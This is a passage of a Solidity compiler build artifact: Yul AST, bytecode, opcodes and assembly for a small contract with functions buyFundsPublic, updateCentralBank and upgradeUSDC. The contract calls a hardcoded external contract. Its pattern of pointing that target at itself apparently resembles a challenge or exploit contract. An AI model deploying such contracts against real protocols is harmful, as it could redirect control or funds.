															"nodeType": "YulAssignment",
															"src": "125:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "137:9:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "148:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "133:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "133:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "125:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "167:9:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value0",
																				"nodeType": "YulIdentifier",
																				"src": "182:6:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "190:42:2",
																				"type": "",
																				"value": "0xffffffffffffffffffffffffffffffffffffffff"
																			}
																		],
																		"functionName": {
																			"name": "and",
																			"nodeType": "YulIdentifier",
																			"src": "178:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "178:55:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "160:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "160:74:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "160:74:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "84:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "95:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "106:4:2",
														"type": ""
													}
												],
												"src": "14:226:2"
											}
										]
									},
									"contents": "{\n    { }\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart, value0) -> tail\n    {\n        tail := add(headStart, 32)\n        mstore(headStart, and(value0, 0xffffffffffffffffffffffffffffffffffffffff))\n    }\n}",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506004361061005d577c010000000000000000000000000000000000000000000000000000000060003504639b6822f88114610062578063e9e8f34d1461006c578063f99a1f3014610074575b600080fd5b61006a61007c565b005b61006a610101565b61006a6101ed565b6000546040517f077bf51a00000000000000000000000000000000000000000000000000000000815233600482015273ffffffffffffffffffffffffffffffffffffffff9091169063077bf51a90602401600060405180830381600087803b1580156100e757600080fd5b505af11580156100fb573d6000803e3d6000fd5b50505050565b6000546040517f8cba468600000000000000000000000000000000000000000000000000000000815230600482015273ffffffffffffffffffffffffffffffffffffffff90911690638cba468690602401600060405180830381600087803b15801561016c57600080fd5b505af1158015610180573d6000803e3d6000fd5b505060008054604080517ff99a1f30000000000000000000000000000000000000000000000000000000008152905173ffffffffffffffffffffffffffffffffffffffff909216945063f99a1f309350600480820193929182900301818387803b1580156100e757600080fd5b60008054604080517ff99a1f30000000000000000000000000000000000000000000000000000000008152905173ffffffffffffffffffffffffffffffffffffffff9092169263f99a1f309260048084019382900301818387803b1580156100e757600080fdfea26469706673582212200ad5e4dbd7bcf2fce90eb205f25e6f8fdafe4eab04cd4d36029b592455a7f24a64736f6c63430008110033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x5D JUMPI PUSH29 0x100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 CALLDATALOAD DIV PUSH4 0x9B6822F8 DUP2 EQ PUSH2 0x62 JUMPI DUP1 PUSH4 0xE9E8F34D EQ PUSH2 0x6C JUMPI DUP1 PUSH4 0xF99A1F30 EQ PUSH2 0x74 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x6A PUSH2 0x7C JUMP JUMPDEST STOP JUMPDEST PUSH2 0x6A PUSH2 0x101 JUMP JUMPDEST PUSH2 0x6A PUSH2 0x1ED JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH32 0x77BF51A00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE CALLER PUSH1 0x4 DUP3 ADD MSTORE PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SWAP1 SWAP2 AND SWAP1 PUSH4 0x77BF51A SWAP1 PUSH1 0x24 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xFB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH32 0x8CBA468600000000000000000000000000000000000000000000000000000000 DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SWAP1 SWAP2 AND SWAP1 PUSH4 0x8CBA4686 SWAP1 PUSH1 0x24 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x16C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x180 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH32 0xF99A1F3000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE SWAP1 MLOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SWAP1 SWAP3 AND SWAP5 POP PUSH4 0xF99A1F30 SWAP4 POP PUSH1 0x4 DUP1 DUP3 ADD SWAP4 SWAP3 SWAP2 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH32 0xF99A1F3000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE SWAP1 MLOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SWAP1 SWAP3 AND SWAP3 PUSH4 0xF99A1F30 SWAP3 PUSH1 0x4 DUP1 DUP5 ADD SWAP4 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE7 JUMPI PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 EXP 0xD5 0xE4 0xDB 0xD7 0xBC CALLCODE 0xFC 0xE9 0xE 0xB2 SDIV CALLCODE 0x5E PUSH16 0x8FDAFE4EAB04CD4D36029B592455A7F2 0x4A PUSH5 0x736F6C6343 STOP ADDMOD GT STOP CALLER ",
							"sourceMap": "386:577:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;479:91;;;:::i;:::-;;759:119;;;:::i;884:77::-;;;:::i;479:91::-;530:4;;521:44;;;;;554:10;521:44;;;160:74:2;530:4:1;;;;;521:32;;133:18:2;;521:44:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;479:91::o;759:119::-;804:4;;795:41;;;;;830:4;795:41;;;160:74:2;804:4:1;;;;;795:26;;133:18:2;;795:41:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;851:4:1;;;842:31;;;;;;;;851:4;;;;;-1:-1:-1;842:29:1;;-1:-1:-1;842:31:1;;;;;851:4;842:31;;;;;;851:4;;842:31;;;;;;;;;;884:77;934:4;;;925:31;;;;;;;;934:4;;;;;925:29;;:31;;;;;;;;;;934:4;;925:31;;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "130000",
								"executionCost": "20470",
								"totalCost": "150470"
							},
							"external": {
								"buyFundsPublic()": "infinite",
								"updateCentralBank()": "infinite",
								"upgradeUSDC()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 386,
									"end": 963,
									"name": "PUSH",
									"source": 1,
									"value": "80"
								},
								{
									"begin": 386,
									"end": 963,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 386,
									"end": 963,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 409,
									"end": 474,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 409,
									"end": 474,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 409,
									"end": 474,
									"name": "SLOAD",
									"source": 1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "A0"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "2"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "EXP",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SUB",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "NOT",
									"source": -1
								},
								{
									"begin": 409,
									"end": 474,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 432,
									"end": 474,
									"name": "PUSH",
									"source": 1,
									"value": "550714E1FD747084FC5CB2B2E3A93512972AEBDA"
								},
								{
									"begin": 409,
									"end": 474,
									"name": "OR",
									"source": 1
								},
								{
									"begin": 409,
									"end": 474,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 409,
									"end": 474,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 386,
									"end": 963,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 386,
									"end": 963,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 386,
									"end": 963,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 386,
									"end": 963,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 386,
									"end": 963,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 386,
									"end": 963,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 386,
									"end": 963,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 386,
									"end": 963,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 386,
									"end": 963,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 386,
									"end": 963,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 386,
									"end": 963,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 386,
									"end": 963,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 386,
									"end": 963,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 386,
									"end": 963,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 386,
									"end": 963,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 386,
									"end": 963,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 386,
									"end": 963,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 386,
									"end": 963,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212200ad5e4dbd7bcf2fce90eb205f25e6f8fdafe4eab04cd4d36029b592455a7f24a64736f6c63430008110033",
									".code": [
										{
											"begin": 386,
											"end": 963,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 386,
											"end": 963,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 386,
											"end": 963,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 386,
											"end": 963,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 386,
											"end": 963,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "tag",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 386,
											"end": 963,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 386,
											"end": 963,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 386,
											"end": 963,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "PUSH",
											"source": 1,
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 386,
											"end": 963,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 386,
											"end": 963,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "PUSH",
											"source": 1,
											"value": "9B6822F8"
										},
										{
											"begin": 386,
											"end": 963,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 386,
											"end": 963,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "PUSH",
											"source": 1,
											"value": "E9E8F34D"
										},
										{
											"begin": 386,
											"end": 963,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 386,
											"end": 963,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "PUSH",
											"source": 1,
											"value": "F99A1F30"
										},
										{
											"begin": 386,
											"end": 963,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 386,
											"end": 963,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "tag",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 386,
											"end": 963,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 386,
											"end": 963,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 386,
											"end": 963,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 479,
											"end": 570,
											"name": "tag",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 479,
											"end": 570,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 479,
											"end": 570,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 479,
											"end": 570,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 479,
											"end": 570,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 479,
											"end": 570,
											"name": "tag",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 479,
											"end": 570,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 479,
											"end": 570,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 759,
											"end": 878,
											"name": "tag",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 759,
											"end": 878,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 759,
											"end": 878,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 759,
											"end": 878,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 759,
											"end": 878,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 884,
											"end": 961,
											"name": "tag",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 884,
											"end": 961,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 884,
											"end": 961,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 884,
											"end": 961,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 884,
											"end": 961,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 479,
											"end": 570,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 479,
											"end": 570,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 530,
											"end": 534,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 530,
											"end": 534,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 521,
											"end": 565,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "PUSH",
											"source": 1,
											"value": "77BF51A00000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 521,
											"end": 565,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 554,
											"end": 564,
											"name": "CALLER",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 521,
											"end": 565,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 160,
											"end": 234,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 530,
											"end": 534,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 530,
											"end": 534,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 530,
											"end": 534,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 530,
											"end": 534,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 530,
											"end": 534,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 521,
											"end": 553,
											"name": "PUSH",
											"source": 1,
											"value": "77BF51A"
										},
										{
											"begin": 521,
											"end": 553,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 133,
											"end": 151,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 133,
											"end": 151,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 521,
											"end": 565,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 521,
											"end": 565,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 521,
											"end": 565,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 521,
											"end": 565,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "EXTCODESIZE",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 521,
											"end": 565,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 521,
											"end": 565,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "tag",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 521,
											"end": 565,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 521,
											"end": 565,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 521,
											"end": 565,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 521,
											"end": 565,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 521,
											"end": 565,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 521,
											"end": 565,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 479,
											"end": 570,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 759,
											"end": 878,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 759,
											"end": 878,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 804,
											"end": 808,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 804,
											"end": 808,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 795,
											"end": 836,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "PUSH",
											"source": 1,
											"value": "8CBA468600000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 795,
											"end": 836,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 830,
											"end": 834,
											"name": "ADDRESS",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 795,
											"end": 836,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 160,
											"end": 234,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 804,
											"end": 808,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 804,
											"end": 808,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 804,
											"end": 808,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 804,
											"end": 808,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 804,
											"end": 808,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 795,
											"end": 821,
											"name": "PUSH",
											"source": 1,
											"value": "8CBA4686"
										},
										{
											"begin": 795,
											"end": 821,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 133,
											"end": 151,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 133,
											"end": 151,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 795,
											"end": 836,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 795,
											"end": 836,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 795,
											"end": 836,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 795,
											"end": 836,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "EXTCODESIZE",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 795,
											"end": 836,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 795,
											"end": 836,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "tag",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 795,
											"end": 836,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 795,
											"end": 836,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 795,
											"end": 836,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 795,
											"end": 836,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 795,
											"end": 836,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 795,
											"end": 836,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 851,
											"end": 855,
